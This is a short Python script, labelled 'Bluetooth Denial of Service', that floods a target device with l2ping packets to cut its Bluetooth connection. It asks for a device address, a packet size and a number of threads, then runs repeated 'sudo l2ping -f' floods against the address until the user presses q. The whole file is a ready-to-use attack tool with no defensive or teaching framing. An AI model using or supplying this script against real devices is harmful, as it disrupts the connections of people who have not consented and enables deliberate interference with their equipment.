#About: Script that uses l2ping to flood a device to interupt their bluetooth connection.
#Version: 1.0
import os
import sys
import time
import subprocess
import keyboard
from threading import Thread

abort_attack = False

def createThreads(address, bulletSize, guns):
    threads = []
    for i in range(guns):
        t = Thread(target=attack, args=(address, bulletSize))
        t.start()
        threads.append(t)
    return threads

def attack(address, bulletSize):
    while not abort_attack:
        subprocess.run(["sudo", "l2ping", "-s", bulletSize, "-f", address])

def stopThreads(threads):
    global abort_attack
    abort_attack = True
    for t in threads: 
        t.join()

def main():
    print("Bluetooth Denial of Service")
    address = input("Enter the device address: ")
    address.strip()
    if len(address) != 17:
        print("Invalid address.")
        input("Press enter to continue...")
        return
    bulletSize = input("Enter bullet size: ")
    guns = min(int(input("How many guns do you want to use? ")), 10)
    createThreads(address, bulletSize, guns)
    keyboard.wait('q')
    return

main()